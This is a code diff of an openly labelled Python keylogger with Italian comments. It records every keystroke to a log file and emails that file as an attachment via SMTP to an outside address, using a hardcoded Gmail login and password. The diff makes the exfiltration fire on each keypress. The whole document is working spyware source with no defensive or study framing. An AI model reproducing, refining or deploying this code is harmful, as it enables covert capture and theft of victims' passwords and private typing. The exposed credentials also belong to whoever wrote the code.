@@ -22,34 +22,36 @@ logging_directory = f"C:/Users/{username}/Documents"
 # crea il file in cui scriverà
 logging.basicConfig(filename=f"{logging_directory}/mylog.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")
 
+mailDestinatario = 'jetisa2728@94jo.com'
+
 #cattura ogni tasto che premiamo
 def key_headler(key):
     logging.info(key)
-    while(time.time() % dopo == 0):
-        server = smtplib.SMTP('64.233.184.108')
-        server.ehlo()
-        server.starttls()
-        server.login('pieroangela827@gmail.com', 'piero728173py')
+    #while(time.time() % dopo == 0):
+    server = smtplib.SMTP('64.233.184.108')
+    server.ehlo()
+    server.starttls()
+    server.login('pieroangela827@gmail.com', 'piero728173py')
 
-        msg = MIMEMultipart()
-        msg['From'] = 'Keylogger'
-        msg['To'] = 'dorak36267@pxjtw.com'
-        msg['Subject'] = 'Ecco cosa ho salvato'
+    msg = MIMEMultipart()
+    msg['From'] = 'Keylogger'
+    msg['To'] = mailDestinatario
+    msg['Subject'] = 'Ecco cosa ho salvato'
 
-        msg.attach(MIMEText('Ecco a te', 'plain'))
+    msg.attach(MIMEText('Ecco a te', 'plain'))
 
-        filename = 'C:/Users/anton/Documents/mylog.txt'
-        attachment = open(filename, 'rb')
+    filename = 'C:/Users/anton/Documents/mylog.txt'
+    attachment = open(filename, 'rb')
 
-        p = MIMEBase('application', 'octet-stream')
-        p.set_payload(attachment.read())
+    p = MIMEBase('application', 'octet-stream')
+    p.set_payload(attachment.read())
 
-        encoders.encode_base64(p)
-        p.add_header('Content-Disposition', f'attachment; filename = {filename}')
-        msg.attach(p)
+    encoders.encode_base64(p)
+    p.add_header('Content-Disposition', f'attachment; filename = {filename}')
+    msg.attach(p)
 
-        text = msg.as_string()
-        server.sendmail('pieroangela827@gmail.com', 'dorak36267@pxjtw.com', text)
+    text = msg.as_string()
+    server.sendmail('pieroangela827@gmail.com', mailDestinatario, text)
 
 ora = time.time()
 dopo = ora + 20
